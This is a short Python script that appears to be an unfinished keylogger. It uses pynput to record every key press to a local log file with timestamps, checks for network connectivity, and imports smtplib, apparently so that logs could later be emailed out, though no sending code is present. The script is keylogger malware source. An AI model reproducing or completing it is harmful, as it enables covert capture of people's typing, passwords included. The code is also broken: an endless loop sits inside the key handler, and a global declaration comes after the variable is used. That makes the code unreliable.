import smtplib
from pynput.keyboard import Key, Listener
import logging
import socket
import os
import time

def nc():
    ipaddress=socket.gethostbyname(socket.gethostname())
    if ipaddress=="127.0.0.1":
        return 0
    else:
        return 1
    
log_dir = ""
global c
c=time.time()
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    while(True):
        logging.info('"{0}"'.format(key))
        if(nc()==1 and (time.time()-c)>=100):
            
            global c
            c=time.time()
            
            
            

with Listener(on_press=on_press) as listener:
    try:
        listener.join()
    finally:
        listener.stop()
       

